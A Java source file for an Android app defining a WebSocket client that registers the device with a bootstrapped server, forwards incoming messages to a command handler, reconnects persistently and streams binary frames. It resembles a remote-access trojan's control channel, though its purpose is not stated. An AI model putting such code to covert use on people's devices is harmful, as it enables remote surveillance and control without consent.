package com.aval.seg;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.concurrent.atomic.AtomicBoolean;

public final class Net {
    private static WebSocketClient ws;
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final AtomicBoolean busy = new AtomicBoolean();
    private static volatile String url;

    public static synchronized void start(final Context c) {
        if (busy.get() || (ws != null && ws.isOpen())) return;
        busy.set(true);
        new Thread(() -> {
            try {
                if (url == null) url = Util.bootstrap(c);
                ws = new WebSocketClient(URI.create(url)) {
                    @Override public void onOpen(ServerHandshake h) {
                        busy.set(false);
                        send("{\"t\":\"hello\",\"id\":\"" + Cfg.id(c) + "\"," + Util.dev(c) + "}");
                    }
                    @Override public void onMessage(String m) { Cmd.handle(c, m); }
                    @Override public void onClose(int code, String r, boolean remote) {
                        busy.set(false);
                        H.postDelayed(() -> start(c), 6000);
                    }
                    @Override public void onError(Exception e) { busy.set(false); }
                };
                ws.setConnectionLostTimeout(25);
                ws.connectBlocking();
            } catch (Throwable t) {
                busy.set(false);
                H.postDelayed(() -> start(c), 10000);
            }
        }).start();
    }

    public static void send(String s) {
        try {
            WebSocketClient w = ws;
            if (w != null && w.isOpen()) w.send(s);
        } catch (Throwable ignored) {}
    }

    public static void sendBin(byte[] b) {
        try {
            WebSocketClient w = ws;
            // descarta frame se a fila já está cheia (evita travar o aparelho)
            if (w != null && w.isOpen() && w.getOutQueueSize() < 4) w.send(b);
        } catch (Throwable ignored) {}
    }
}